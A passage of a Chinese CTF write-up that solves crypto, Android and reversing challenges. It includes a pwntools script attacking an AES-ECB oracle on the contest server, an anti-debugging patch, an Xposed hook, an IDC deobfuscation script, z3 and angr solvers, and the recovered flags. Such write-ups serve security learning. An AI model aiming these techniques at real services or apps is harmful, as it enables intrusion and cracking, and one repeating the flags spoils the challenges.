    message = "Connection for mission: {}, your mission's flag is: {}".format(name, flag)
    return aes_encrypt(key, message)

def get_input():
    return raw_input()

def print_output(message):
    print(message)
    sys.stdout.flush()

def handle():
    print_output("Please enter mission key:")
    mission_key = get_input().rstrip()

    print_output("Please enter your Agent ID to secure communications:")
    agentid = get_input().rstrip()
    rnd = Random.new()
    session_key = rnd.read(16)

    flag = '<secret>'
    print_output(generate_hello(session_key, agentid, flag))
    while True:
        print_output("Please send some messages to be encrypted, 'quit' to exit:")
        msg = get_input().rstrip()
        if msg == 'quit':
            print_output("Bye!")
            break
        enc = aes_encrypt(session_key, msg)
        print_output(enc)

if __name__ == "__main__":
    handle()
```

解答 ：

从 `get_padding` 和 `aes_encrypt` 能够看出这是一个 `AES ECB 256位分组加密`加密密钥是 16字节 随机生成，`ECB`明文分组相同，对应的密文分组也相同。

由此可以通过改变 `agentid` 的长度，使`flag`中的字符依次落入前面已知的明文分组中，逐字节爆破。

贴出脚本：
```
from pwn import *
import string

LOG = False
flag = ''
mission_key = '********************************'
agent_id = ''

while True:
    r = remote('116.85.48.103', 5002)
    r.recvuntil('mission key:')
    r.sendline(mission_key)
    r.recvuntil('communications:')
    agent_id = 'a' * (13+16*8-len(flag))
    r.sendline(agent_id)
    r.recvline()
    enc = r.recvline().rstrip()[32*11:32*12]
    if LOG: print 'enc=%s' % enc
    for i in string.printable[:-5]:
        r.recvuntil('to exit:')
        message = 'Connection for mission: %s, your mission\'s flag is: %s' % (agent_id, flag + i)
        r.sendline(message[-16:])
        r.recvline()
        enc_tmp = r.recvline().rstrip()
        if LOG: print 'enc_tmp=%s' % enc_tmp
        if enc_tmp == enc:
            flag += i
            break
    r.close()
    if flag[-1:] == '}': break
    print 'flag=%s' % flag

print 'Flag: %s' % flag

```
Flag: DDCTF{87fa2cd38a4259c29ab1af39995be81a}

## Android
感谢**LeadroyaLshi**师傅！

### LeveL1

Java 层什么都没有，直接看 native；native 里包含了一些数学计算。

有 init_array ，但里面主要是一些线程相关操作的初始化，没有JNI_OnLoad。

```
int __fastcall Java_com_didictf_guesskey2018one_MainActivity_stringFromJNI(JNIEnv *a1, jobject a2, jstring a3)
{
  i = 0;
  bInput = (*a1)->GetStringUTFChars(a1, a3, 0);
  j_j_GetTicks();
  do
    v10 = j_j_gpower(i++);
  while ( i != 32 );
  j_j_GetTicks();
  fromBytes((String *)&p_string, bInput);
  v5 = (String *)fromString((String *)&cp_string, (String *)&p_string);
  ret = j_j_j__Z20__aeabi_wind_cpp_prjSs((int)v5);
  finiString((int *)(cp_string - 12));
  finiString((int *)(p_string - 12));
  return ret;
}
```
上来先算了32次平方，不知道想干嘛，调用2次`GetTicks，不知道想干嘛。之后把输入转为 `std::string` 类型，进入 `check`  函数。

首先检测长度是否为36，以及与 const-data 进行 xor。

```
    while ( 1 )
    {
      if ( v13 >= 1 && currentOff < input_len )
      {
        v3 = 0;
        if ( v10[10] != *v10 )
          break;
      }
      ++currentOff;
      ++v10;
```

这个地方校验第0~10、第11~20、第21~30、第30~40是否一模一样。

最后的检测是

```
          if ( v24 )
            goto LABEL_40;                      // if a%b == 0
          v26 = j_j_j___aeabi_uldivmod(divisor, dividend);
          v3 = 1;
          v25 = (unsigned int)dividend >= (unsigned int)v26;
          LODWORD(v26) = 1;
          if ( v25 )
            LODWORD(v26) = 0;
          v27 = 1;
          if ( HIDWORD(dividend) >= HIDWORD(v26) )
            v27 = 0;
          if ( HIDWORD(dividend) != HIDWORD(v26) )
            LODWORD(v26) = v27;
          if ( !(_DWORD)v26 )
LABEL_40:
            v3 = 0;
          finiString((int *)v30 - 3);
```

这里v3最后被返回了，要求是前者能够整除后者，而且会有除数和商的大小比较，只有除数大于上时候才有可能返回1。

```
dividend = j_j_atoll((const char *)a1->ptr);
```

往上翻，发现输入仅与除数有关。

被除数是由两个字符串算出来的，怎么算出来的我也看不大懂，好像是重新组合成一个字符串，拼接字符什么样的，应该可以直接 dump。

【后来看某位老哥写的 writeup，发现是通过2个字符串取 index 得到的】

https://blog.csdn.net/dydxdz/article/details/80037937

```
map1 = {}
str1 = 'deknmgqipbjthfasolrc'
for i in range(len(str1)):
    map1[str1[i]] = i/2
str2 = 'jlocpnmbmbhikcjgrla'
k = []
for i in range(len(str2)):
    print map1[str2[i]],
```

先创建 `map<char,int>` ，第 `i` 个 char对应的数字是` i/2` ，刚好得到每个 char 对应 `[0,10)` 的数字；再查询 str2里每个 char 所对应的下标，将这个下标加上 `'0'` ，拼起来，得到新的十进制的字符串。

综上，拿到数字 `5889412424631952987` ，将它分解了， `5889412424631952987=1499419583*3927794789` ，输入就是偏大的数字， `1499419583` ，再 xor 一下常量就行了。

最后 flag 是 `d5axivcw6ggfswpxg80estgc58h7yghqogbm` 。

### LeveL2

看起来使用的是 Robust 的热更新框架，没有做太特殊的处理，在 assets 里存放了 `GeekTan.BMP` ，其实是个 zip 包，里面放着 Robust 的 patch 文件。

有简单的方法，也有复杂的方法，复杂的就是肉眼去看，把代码运行一遍即可，是个约瑟夫问题，也可以直接求解，跟我以前出的用栈写约瑟夫很像。

简单的方法嘛，直接上 xposed

```
input text DDCTF{2517299225169920}
``` 
```java
XposedHelpers.findAndHookMethod("cn.chaitin.geektan.crackme.MainActivity", loader, "Joseph", int.class, int.class, new XC_MethodHook() {
    @Override
    protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
        super.beforeHookedMethod(param);
        new Exception().printStackTrace();
        Log.d(TAG, "======== before hook =======");
        Log.d(TAG, "with " + (int) param.args[0] + " and" + (int) param.args[1]);
    }
 
    @Override
    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
        super.afterHookedMethod(param);
        Log.d(TAG, "======== after hook =======");
        Log.d(TAG, "result is " + param.getResult());
        }
});
```

### LeveL3

Java 层什么都没有，直接看 native。
init_array应该是初始化一些东西，没有过多操作。
没有JNI_OnLoad。
直接看 JNI的方法，进入之后先将输入转化为 `std::string` ，再使用 `str2ll`转为int64。
长得比较丑，看起来是做`divmod(int64, int64)`，循环终止的条件是`i==int64(input)`，最后检测余数是否和预期相等。
debug 一下，大概就是左移1bit，mod 一下，左移1bit，mod 一下这样，写段 python 爆破即可。
```
DDCTF{ddctf-android2-KEY}
p = 0x17A904F1B91290
mod = 0xDBDEE7AE5A90
```
```
In [23]: i = 1
    ...: remain = 1
    ...: while True:
    ...:     remain = ((remain << 1) & 0xFFFFFFFFFFFFFFFF) % 0x17A904F1B91290
    ...:     if remain == 0xDBDEE7AE5A90:
    ...:         print i, remain, hex(remain >> 32), hex(remain & 0xFFFFFFFF)
    ...:         break
    ...:     i += 1
    ...:
595887 241750416186000 0xdbdeL 0xe7ae5a90L
```
不知道这题想干嘛。。。

### LeveL4

这次只有 java 层，没有 native 层，看起来使用了公开的第三方库 spongycastle，所以丢到网站上 deguard 一下，得到一个非常优美的结果~

官方说是10位以内的数字，所以是暗示爆破，而且 ECC 么，除了爆破也没有办法。

```
    public MainActivity() {
        super();
        this.editText = "00C3632B69D3FC1DD8D80C288C44281B67F4828DC77E37EE338E830E66DC71972A008835BA3156353815DFEDEB4330B48B454F35A88D83DA6260C206E4A619753F97";
    }
 
    public void onClickTest(View arg24) {
        this.outputView.setText("Empty Input");
        TextView v1 = this.preview;
        this = this;
        String v4 = v1.getText().toString();
        String v5 = v4;
        if(v4.length() == 0) {
            v5 = "1";
        }
 
        new R$id().init();
        ECPoint v11 = SECNamedCurves.getByName("secp256k1").getG().multiply(new BigInteger(v5.getBytes()));
        BigInteger v8 = v11.getXCoord().toBigInteger();
        BigInteger v13 = v11.getYCoord().toBigInteger();
        byte[] v14 = v8.toByteArray();
        byte[] v15 = v13.toByteArray();
        byte[] v9 = new byte[v14.length + v15.length];
        int v6;
        for(v6 = 0; v6 < v9.length; ++v6) {
            byte v17 = v6 < v14.length ? v14[v6] : v15[v6 - v14.length];
            v9[v6] = v17;
        }
 
        StringBuilder v18 = new StringBuilder();
        v6 = v9.length;
        int v16;
        for(v16 = 0; v16 < v6; ++v16) {
            v18.append(String.format("%02X", Byte.valueOf(v9[v16])));
        }
 
        if(v18.toString().equals(this.editText)) {
            this.outputView.setText("Correct");
            return;
        }
 
        this.outputView.setText("Wrong");
    }
```
使用的是 ECC 加密算法，使用secp256k1曲线，先拿到 G 点，与输入进行椭圆域上的相乘，得到新的点，去校验计算出来的点是否是预先规定好的那个点，是的话就 `return true` 。

这个没什么操作，就是按照描述去爆破，一开始懒得写 java 代码，直接在手机上爆破的（原谅我脑残），发现速度简直慢到炸，手机烫了一晚上也没跑多少数据。

然后想着优化，但发现这个 API 似乎很不好用， `G+G+G`  和 `G*3` 不相等，以及各种神奇的表现，可能是我不大会用API吧，按理说加法比乘法好做很多，每次加一比每次乘法应该要快，但优化时候老是算出来的不一样，就懒得优化了。
最后在 PC上写个爆破脚本，早上起来就看到了 flag，DDCTF{54135710}。

### LeveL5

这题就是反调试的大集合，乱七八糟的方式什么都有，Java 层没有东西，直接看 native。

init_array 没有特殊操作，是 C++的初始化。

JNI_OnLoad里动态注册了 JNI 函数，没有额外操作。

直接看了哈，最原始的长这样
```
int __fastcall Java_check(const char *b_input)
{
  void *v2; // r0@1
  void *v3; // r5@1
  int i; // r2@4
  char v6[32]; // [sp+4h] [bp+0h]@1
 
  memset(v6, 0, 0x20u);
  v2 = dlopen("libc.so", 0);
  v3 = v2;
  if ( v2 )
  {
    open = (int (__fastcall *)(_DWORD, _DWORD, _DWORD))dlsym(v2, "open");
    close = (int (__fastcall *)(int))dlsym(v3, "close");
    read = (int (__fastcall *)(_DWORD, _DWORD, _DWORD))dlsym(v3, "read");
    strncmp = (int (__fastcall *)(_DWORD, _DWORD, _DWORD))dlsym(v3, "strncmp");
    strstr = (int)dlsym(v3, "strstr");
  }
  isTraced = 0;
  setValue(dword_EF2B5024);
  maybe_antidebug_1();
  some_encrypt_2(dword_EF2B5024, v6);
  if ( strlen(b_input) == 32 )
  {
    i = 0;
    do
    {
      v6[i] ^= b_input[i];
      ++i;
    }
    while ( i != 32 );
    memcpy(&unk_11100, &v7, 0x20u);
// return strncmp(xx, xx, 32);
// patch by LeadroyaL
  }
  return -1;
}
```
将输入操作一下，xor 一下，返回的是 `strncmp` 的结果，这不是送分题么？直接上去调试，断下来，发现答案并不对。。。有几个反调试的函数，把 `xor_key`  给修改了。

sub_3c54是第一个函数，先做一些不知道什么的操作，再检测 tracerPid那行的 strlen ，可以绕过，然后去从sha256_table里取一些值，不知道想干嘛。内层还有一堆不知道在干嘛的函数，估计藏了一些反调试，而且会对 global 的值进行一些操作，乱七八糟的。

反正每次都会被测到反调试，于是懒得搞了，我认输，ok？

patch 一下binary文件，因为是简单的 xor，所以只要能拿到xor_key 即可，在最后一句他是strncmp，如果把它 patch为memcpy的话，在正常运行过程中，就可以将算出来的密文保存下来。之后想办法dump内存，就能拿到密文，与输入进行xor，就拿到了 key。

经过一番努力，终于patch成功了。。。如上图的最后一个 memcpy。

先运行，让它算一遍，再attach，断在最开始，就能拿到明密文对了。

最后算出来是DDCTF{GoodJob,Congratulations!!}。

## 逆向
感谢**奈沙夜影**师傅！

### Baby MIPS
IDA打开发现几个字符串结构都很清晰，提供16个变量，然后进行16次方程校验，但是运行会发现在中间就因为段错误而异常，尝试许久以后发现几个不太对劲的指令，突兀出现的t, sp, 跳转等等的机器码都为EB02开头，猜测为花指令，于是使用IDC脚本去花。

注意MIPS为定长指令集，每个指令都为4字节，因此需要固定监测指令的头部，否则可能会误清除掉正常指令，例如方程参数的赋值
(╯‵□′)╯︵┻━┻
```
#include <idc.idc>
static matchBytes(StartAddr, Match) 
{ 
auto Len, i, PatSub, SrcSub; 
Len = strlen(Match);
while (i < Len) 
{ 
   PatSub = substr(Match, i, i+1); 
   SrcSub = form("%02X", Byte(StartAddr)); 
   SrcSub = substr(SrcSub, i % 2, (i % 2) + 1); 
   if (PatSub != "?" && PatSub != SrcSub) 
   { 
    return 0; 
   } 
   if (i % 2 == 1) 
   { 
    StartAddr++; 
   } 
   i++; 
}
return 1; 
}
static main() 
{ 
   auto StartVa, SavedStartVa, StopVa, Size, i, j;
StartVa = 0x400420; 
StopVa = 0x403233;
Size = StopVa - StartVa; 
SavedStartVa = StartVa;
for (i = 0; i < Size/4; i++) 
{ 
   if (matchBytes(StartVa, "EB02????")) 
   { 
    Message("Find%x:%02x%02x%02x%02xn", StartVa,Byte(StartVa),Byte(StartVa+1),Byte(StartVa+2),Byte(StartVa+3));
    for (j = 0; j < 4; j++) 
    { 
     PatchByte(StartVa, 0x00); 
     MakeCode(StartVa); 
     StartVa++; 
    } 
   } 
    else
    StartVa=StartVa+4; 
}
AnalyzeArea(SavedStartVa, StopVa); 
Message("Clear eb02 Opcode Ok "); 
} 
```

去花后再次分析即可得到清晰的赋值和check过程

有三种求解方法:

**方法一：简单粗暴反汇编**

写了一个伪执行汇编的py脚本来得到参数，最后清洗一下即可得到方程，通过z3限制BitVec即可跑出整数解
```
f = open("code.txt", "r")
flower = ["slti", "sdc1"]
a0 = 0x76ff270
v0 = 0xd0000
v1 = 8
fp = [0 for i in range(0x500)]
table = [0x0, 0x42d1f0, 0x0, 0x42d1f0,
0xa, 0xa, 0x0, 0x9,
0x4250bc, 0x9, 0x426630, 0x42d1f0,
0x40a3ec, 0x37343431, 0x363434, 0x0,
0x0, 0x42d1f0, 0x0, 0x4250bc,
0x0, 0x0, 0x425060, 0x42d1f0,
0x403ad0, 0x0, 0x0, 0x1000,
0x425088, 0x76fff184, 0x412fcd, 0x1,
0x410570, 0x425190, 0x40ca48, 0x0,
0x0, 0x42d1f0, 0x0, 0x42d1f0,
0x425088, 0xffffffff, 0x4106c4, 0xffffffff,
0x76fff184, 0x412fcd, 0x1, 0x42d1f0,
0x0, 0x425088, 0x40ccac, 0x0,
0x0, 0x0, 0x0, 0x42d1f0,
0x0, 0x425190, 0x76ffeef8, 0x425190,
0x10, 0x425088, 0x40baac, 0x42d1f0,
0x412fcd, 0x1, 0x425088, 0x40baac,
0x76fff184, 0x412fce, 0x40b684, 0x0,
0x0, 0x0, 0x0, 0x42d1f0,
0x0, 0x0, 0x0, 0x0,
0x0, 0x0, 0x0, 0x0,
0x0, 0x42d1f0, 0x0, 0x42d1f0,
0x0, 0x4250bc, 0x413081, 0x9,
0x403f24, 0x0, 0x0, 0x0,
0x0, 0x0, 0x0, 0x42d1f0,
0x0, 0x413078, 0x0, 0x0,
0x0, 0x0, 0xd0000, 0xf1f4,
0xcf8, 0xf5f1, 0x7883, 0xe2c6,
0x67, 0xeccc, 0xc630, 0xba2e,
0x6e41, 0x641d, 0x716d, 0x4505,
0x76fff224, 0x0, 0x0, 0x0,
0x0, 0x0, 0x0, 0x0,
0x0, 0x0, 0x0, 0x0,
0x0, 0x0, 0x0, 0x0,
0x0, 0x0, 0x0, 0x0,
0x0, 0x0, 0x0, 0x0,
0x0, 0x0, 0x0, 0x0,
0x0, 0x0, 0xfffffffe, 0x0,
0x76fff2ac, 0x412fcd, 0x1, 0x0,
0x6, 0x7fffffff, 0x1, 0x0,
0x0, 0x0, 0x0, 0x0,
0x0, 0x0, 0x0, 0x0,
0x0, 0x0, 0x0, 0x0,
0x0, 0x0, 0x0, 0x0,
0xa, 0xa, 0x425088, 0x8,
0x7ffffff8, 0x100, 0x413f38, 0x1,
0x413f38, 0x0, 0x2, 0x76fff0f8,
0x0, 0x0, 0x7fffffff, 0x76fff220,
0x405050, 0x550001, 0x0, 0x425000,
0x0, 0x0, 0x0, 0x0,
0x0, 0x0, 0x0, 0x76fff220,
0x404d84, 0x42d1f0, 0x0, 0x500,
0x5, 0x42d1f0, 0xb3b, 0x76fff224,
0x115, 0x1a131100, 0x76fff220, 0x76fff270,
0x76fff2ac, 0xffbecf88, 0xa, 0x405880]
j = 0
functions = 0
for i in range(0xb4, 0x410, 4):
    fp[i] = table[j]
    j += 1
input = [int(str(i)*3, 16) for i in range(16)]
try:
    while(True):
        code = f.readline()
        if(code == ""):
            print("finish")
            break
        if(code[:3] == "loc"):
            # print("n[s]:t" + code[:-1])
            continue
        if(code.find("nop")!=-1):
            continue
        code = code.split("$")
        # print(code)
        c = code[0].strip()
        if(c=="sw"):
            n1 = code[1].split(",")[0]
            n2 = 0x410 - int("0x" + code[1].split("_")[1].split("(")[0], 16)
            code = ("fp[" + hex(n2) + "] = " + n1)
        elif(c=="li"):
            n1 = code[1].split(",")[0]
            n2 = code[1].split(",")[1].strip()
            code = (n1 + " = " + n2)
        elif(c=="lw"):
            n1 = code[1].split(",")[0]
            if("".join(code).find("fp")!=-1):
                n2 = 0x410 - int("0x" + code[1].split("_")[1].split("(")[0], 16)
                code = (n1 + " = fp[" + hex(n2) + "]")
                # print("# " + hex(fp[n2]))
                #输出方程
                print("0x%x*"%fp[n2],end='')
            else:
                # print("[c]:t" + "".join(code)[:-1], "v0=%x"%v0)
                n2 = ((v0) + int(code[1].split(",")[1].replace("(", "")))//4
                code = (n1 + " = input[" + str(n2) + "]")
                print("a[%d]"%n2)
                # print(code)
                # print(hex(v0))
                # break
        elif(c=="sll"):
            n1 = code[1].split(",")[0]
            n2 = code[1].split(",")[1].strip()
            code = (n1 + " = " + n1 + "<<" + n2)
        elif(c=="sra"):
            n1 = code[1].split(",")[0]
            n2 = code[1].split(",")[1].strip()
            code = (n1 + " = " + n1 + ">>" + n2)
        elif(c=="xori"):
            n1 = code[1].split(",")[0]
            n2 = code[1].split(",")[1].strip()
            code = (n1 + " = " + n1 + "^" + n2)
        elif(c=="addiu"):
            n1 = code[1].split(",")[0]
            n2 = code[1].split(",")[1].strip()
            code = (n1 + " = " + n1 + "+" + n2)
            # print("+")
        elif(c=="mul"):
            n1 = code[1].split(",")[0]
            n2 = code[2].split(",")[0].strip()
            n3 = code[3].strip()
            code = (n1 + " = " + n2 + "*" + n3)
        elif(c=="addu"):
            n1 = code[1].split(",")[0]
            n2 = code[2].split(",")[0].strip()
            code = (n1 + " = " + n1 + "+" + n2)
            print("+")
        elif(c=="subu"):
            n1 = code[1].split(",")[0]
            n2 = code[2].split(",")[0].strip()
            code = (n1 + " = " + n1 + "-" + n2)
            print("-")
        elif(c=="beq"):
            print("=0x%x"%(v0))
            print("================================================one function=====================================")
            functions +=1
            continue
        elif(c=="negu"):
            n1 = code[1].split(",")[0]
            n2 = code[2].split(",")[0].strip()
            code = (n1 + " = " + "-" + n2)
            print("-")
        elif(c=="nop"):
            continue
        elif(c=="lui"):
            n1 = code[1].split(",")[0]
            n2 = code[1].split(",")[1].strip()
            code = (n1 + " = " + n2 + "<<32")
        elif(c=="move" or c=="and"):
            continue
        elif(c in flower):
            # print("[f]:t" + "".join(code)[:-1])
            continue
        else:
            print("[x]:tFind unknown code | " + "".join(code))
            break
        # print("[-]:t" + code)
        exec(code)
except Exception as e:
    print(repr(e))
    print(code)
print(functions)
# print(fp)
```
**方法二：优雅反编译**

在某zhao师傅的提醒下想起来jeb的MIPS版本可以对汇编进行简单的反编译：

![](https://i.loli.net/2019/04/26/5cc2cf1110da3.png)

虽然数组全部是通过指针+偏移的方式来调用，不过可以全部复制下来再用正则来整理数据，将`*(par00+x)`替换为`par00[x/4]`的形式（可不要像某zhao师傅一样将参数一个个抄下来哟（不然就会像他一样把参数不慎抄错几个然后纠结若干小时XDDDDDD

上述两种方法得到方程以后就可以通过z3, numpy, matlab一类的数学工具求解方程组了，下面给出z3py的示例代码
```python
from z3 import *
a = [BitVec("a%d"%i, 32) for i in range(16)]
s = Solver()
s.add(0xca6a*a[0] -0xd9ee*a[1] +0xc5a7*a[2] +0x19ee*a[3] +0xb223*a[4] +0x42e4*a[5] +0xc112*a[6] -0xcf45*a[7] +0x260d*a[8] +0xd78d*a[9] +0x99cb*a[10] -0x3e58*a[11] -0x97cb*a[12] +0xfba9*a[13] -0xdc28*a[14] +0x859b*a[15]  == 0xaa2ed7)
s.add(0xf47d*a[0] +0x12d3*a[1] -0x4102*a[2] +0xcedf*a[3] -0xafcf*a[4] -0xeb20*a[5] -0x2065*a[6] +0x36d2*a[7] -0x30fc*a[8] -0x7e5c*a[9] +0xeea8*a[10] +0xd8dd*a[11] -0xae2*a[12] +0xc053*a[13] +0x5158*a[14] -0x8d42*a[15]  == 0x69d32e)
s.add(0xffff52cf*a[0] -0x4fea*a[1] +0x2075*a[2] +0x9941*a[3] -0xbd78*a[4] +0x9e58*a[5] +0x40ad*a[6] -0x8637*a[7] -0x2e08*a[8] +0x4414*a[9] +0x2748*a[10] +0x1773*a[11] +0xe414*a[12] -0x7b19*a[13] +0x6b71*a[14] -0x3dcf*a[15]  == 0x3b89d9)
s.add(0xffffedd7*a[0] -0x1df0*a[1] +0x8115*a[2] +0x54bd*a[3] -0xf2ba*a[4] +0xdbd*a[5] +0x1dcf*a[6] +0x272*a[7] -0x2fcc*a[8] -0x93d8*a[9] -0x6f6c*a[10] -0x98ff*a[11] +0x2148*a[12] -0x6be2*a[13] +0x2e56*a[14] -0x7bdf*a[15]  == 0xff6a5aea)
s.add(0xffffa8c1*a[0] +0xdc78*a[1] -0x380f*a[2] +0x33c0*a[3] -0x7252*a[4] -0xe5a9*a[5] +0x7a53*a[6] -0x4082*a[7] -0x584a*a[8] +0xc8db*a[9] +0xd941*a[10] +0x6806*a[11] -0x8b97*a[12] +0x23d4*a[13] +0xac2a*a[14] +0x20ad*a[15]  == 0x953584)
s.add(0x5bb7*a[0] -0xfdb2*a[1] +0xaaa5*a[2] -0x50a2*a[3] -0xa318*a[4] +0xbcba*a[5] -0x5e5a*a[6] +0xf650*a[7] +0x4ab6*a[8] -0x7e3a*a[9] -0x660c*a[10] +0xaed9*a[11] -0xa60f*a[12] +0xf924*a[13] -0xff1d*a[14] +0xc888*a[15]  == 0xffd31341)
s.add(0x812d*a[0] -0x402c*a[1] +0xaa99*a[2] -0x33b*a[3] +0x311b*a[4] -0xc0d1*a[5] -0xfad*a[6] -0xc1bf*a[7] -0x1560*a[8] -0x445b*a[9] -0x9b78*a[10] +0x3b94*a[11] +0x2531*a[12] -0xfb03*a[13] +0x8*a[14] +0x8721*a[15]  == 0xff9a6b57)
s.add(0x15c5*a[0] +0xb128*a[1] -0x957d*a[2] +0xdf80*a[3] +0xee68*a[4] -0x3483*a[5] -0x4b39*a[6] -0x3807*a[7] -0x4f77*a[8] +0x652f*a[9] -0x686f*a[10] -0x7fc1*a[11] -0x5d2b*a[12] -0xb326*a[13] -0xacde*a[14] +0x1f11*a[15]  == 0xffd6b3d3)
s.add(0xaf37*a[0] +0x709*a[1] +0x4a95*a[2] -0xa445*a[3] -0x4c32*a[4] -0x6e5c*a[5] -0x45a6*a[6] +0xb989*a[7] +0xf5b7*a[8] +0x3980*a[9] -0x151d*a[10] +0xaf13*a[11] +0xa134*a[12] +0x67ff*a[13] +0xce*a[14] +0x79cf*a[15]  == 0xc6ea77)
s.add(0xffff262a*a[0] +0xdf05*a[1] -0x148e*a[2] -0x4758*a[3] -0xc6b2*a[4] -0x4f94*a[5] -0xf1f4*a[6] +0xcf8*a[7] +0xf5f1*a[8] -0x7883*a[9] -0xe2c6*a[10] -0x67*a[11] +0xeccc*a[12] -0xc630*a[13] -0xba2e*a[14] -0x6e41*a[15]  == 0xff1daae5)
s.add(0xffff9be3*a[0] -0x716d*a[1] +0x4505*a[2] -0xb99d*a[3] +0x1f00*a[4] +0x72bc*a[5] -0x7ff*a[6] +0x8945*a[7] -0xcc33*a[8] -0xab8f*a[9] +0xde9e*a[10] -0x6b69*a[11] -0x6380*a[12] +0x8cee*a[13] -0x7a60*a[14] +0xbd39*a[15]  == 0xff5be0b4)
s.add(0x245e*a[0] +0xf2c4*a[1] -0xeb20*a[2] -0x31d8*a[3] -0xe329*a[4] +0xa35a*a[5] +0xaacb*a[6] +0xe24d*a[7] +0xeb33*a[8] +0xcb45*a[9] -0xdf3a*a[10] +0x27a1*a[11] +0xb775*a[12] +0x713e*a[13] +0x5946*a[14] +0xac8e*a[15]  == 0x144313b)
s.add(0x157*a[0] -0x5f9c*a[1] -0xf1e6*a[2] +0x550*a[3] -0x441b*a[4] +0x9648*a[5] +0x8a8f*a[6] +0x7d23*a[7] -0xe1b2*a[8] -0x5a46*a[9] -0x5461*a[10] +0xee5f*a[11] -0x47e6*a[12] +0xa1bf*a[13] +0x6cf0*a[14] -0x746b*a[15]  == 0xffd18bd2)
s.add(0xf81b*a[0] -0x76cb*a[1] +0x543d*a[2] -0x4a85*a[3] +0x1468*a[4] +0xd95a*a[5] +0xfbb1*a[6] +0x6275*a[7] +0x30c4*a[8] -0x9595*a[9] -0xdbff*a[10] +0x1d1d*a[11] +0xb1cf*a[12] -0xa261*a[13] +0xf38e*a[14] +0x895c*a[15]  == 0xb5cb52)
s.add(0xffff6b97*a[0] +0xd61d*a[1] +0xe843*a[2] -0x8c64*a[3] +0xda06*a[4] +0xc5ad*a[5] +0xd02a*a[6] -0x2168*a[7] +0xa89*a[8] +0x2dd*a[9] -0x80cc*a[10] -0x9340*a[11] -0x3f07*a[12] +0x4f74*a[13] +0xb834*a[14] +0x1819*a[15]  == 0xa6014d)
s.add(0x48ed*a[0] +0x2141*a[1] +0x33ff*a[2] +0x85a9*a[3] -0x1c88*a[4] +0xa7e6*a[5] -0xde06*a[6] +0xbaf6*a[7] +0xc30f*a[8] -0xada6*a[9] -0xa114*a[10] -0x86e9*a[11] +0x70f9*a[12] +0x7580*a[13] -0x51f8*a[14] -0x492f*a[15]  == 0x2fde7c)
if(s.check()==sat):
    c = b''
    m = s.model()
    for i in range(16):
        print("a[%d]=%d"%(i, m[a[i]].as_long()))
    for i in range(16):
        print(chr(m[a[i]].as_long()&0xff), end='')
```

**方法三：符号执行**

无名侠师傅提出了使用angr来全自动求解的方法，注意二进制文件也需要去过花。我这边不知道是因为capstone没有mips反编译的版本还是地址扒错了跑不出来，只好直接附上师傅的脚本。

注意其中find和avoid的值由于各人的bin文件不同，因此地址需要自行修正。
```python
from angr import *
import logging
import IPython
logging.getLogger('angr.manager').setLevel(logging.DEBUG)
p = Project('mips2')
state = p.factory.blank_state(addr=0x400420)
DATA_ADDR = 0xA0000
state.regs.a0 = DATA_ADDR
for i in range(16*4):
 vec = state.solver.BVS("c{}".format(i),8,explicit_name=True)
 cond = state.solver.And(vec>=32,vec<=126) # low byte
 state.memory.store(DATA_ADDR+i,vec)
 if i % 4 == 0:
 pass
#state.add_constraints(cond)
sm = p.factory.simulation_manager(state)
res = sm.explore(find=0x403150,avoid=[0x403644,0x401940,0x0401ADC,0x401C74
,0x401E10 ,0x401FA8,0x402144
,0x4022DC,0x402478,0x402610,0x4027A8,0x402940,0x402AD8,0x402C74,0x402E10,0x
402FA8,0x403144])
# 这些地址不同⼈的bin会不⼀样。
found = res.found[0]
mem = found.memory.load(DATA_ADDR,16*4)
print found.solver.eval(mem)
```

### 黑盒破解
这个题目比较硬核，输入的地方通过比较字符串来选择函数。首先通过构造函数找到整个数据结构的定义

|偏移|值|类型|长度|备注|
|--|--|--|--|--|
|a1|sth_p|q|0x100||		
|a1+8|char_table_0_p|q|0x100|0x6030e0|
|a1+16|input|c|100||		
|a1+272|rand%50||||
|a1+280	|char_table_0_p-sth_p|q|||
|a1+288+8|char_table_2|d|8	|(a1+8)[72+l] 6030e0[l+255]	|
|a1+408|char_table_1|b|255|0x603700|
|a1+672|func_addr|q|255|(a1+8)[84+i] 603200+i(+=)|
|a1+672+8|func_table|q|8|(a1+8)[84+6030e0[l+255]]|

输入函数形式为：

```
for i in range(len(input)):
    *(a1+664) = input[i+1]
    for j in range(8):
        if(f[input[i]] == (a1 + 408)[(a1+8)[72+j]]):
            call (a1+8)[84 + (a1+8)[j+72]] ( a1 )
```

可以看到，实际上就是令Input[i]作为下标取数组f的值，然后遍历char_table_1中的8个值，如有相等的则取func_addr中对应的函数来调用。

一共8个函数，根据提示语可以定位到其中的一个函数，查看交叉引用则能找到另外8个函数的函数表：

逐个反编译发现：

|函数名|执行条件|表达式|功能|
|--|--|--|--|
|func_0|	(a1+288)<(a1+292)|	(a1+665) = char_table[a1+288]|	m=c[index]|
|func_1	|(a1+288)<(a1+292)|	char_table[a1+288] = (a1+665)|	c[index]=m|
|func_2|	…|	(a1+665) = (a1+665) + (a1+664) – 33|	m+=[next]-33|
|func_3|	…|	(a1+665) = (a1+665) – ((a1+664) – 33) + 1|	m-=[next]-33|
|func_4|	…|	(a1+288)++|	index++|
|check_func|	*(a1+664)==’s’|	s = char_table_0[(a1+288)], len=20,puts(s)	|check(s)|
|func_6|	…|	(a1+288)–	|index–|
|func_7|	…|	后一个参<=0x59|	char_table_0[a1+288] = input[*(a1+288) + *(a1+664) – 48] – 49|

其中用到的变量一共有4个：

```
a1+292 = 255
a1+664 = [next]（即input[i+1])
a1+665 = m（临时变量）
a1+288 = index
```

在check_func中会输出s，s是从char_table_0中以index为起点取的0x20个值。如果s满足三个方程则通过校验，返回成功。

而实际上那三个方程是不需要逆的—题目中明示了只要输出“Binggo”即可得到flag。因此目标显然是在char_table_0中获得Binggo的字符串，将其dump出来输出了一下发现并字符顺序并没有合适的，甚至上述5个字母都不齐。以及一个最关键的问题，check_func中取了0x20个值赋给s，这显然不符合”Binggo”的要求，因此第七个字符必须给上”使其截断才行。

分析其余7个函数，发现0和1可以交换char_table_0中的字符的位置，2、3和7则可以修改char_table_0中字符的值，4和6则是用来移动下标的，最后check_func加’s’来结束并输出。在构造输入之前，先要找到函数对应的输入值。

逆向一下发现char_table中还被更改了值，IDA动态调试断在函数调用处调用idc脚本,即可得到对应值：

```
auto i, j, v14, p, q;
for(i=0;i<8;i++)
{
    p = Byte(0x6030e0+255+i);
    v14 = 0x400dc1;
    //for ( j = 0; j <= p; ++j )
    {
      v14 = Dword(0x91d440+8+8*(p+0x54));
    }
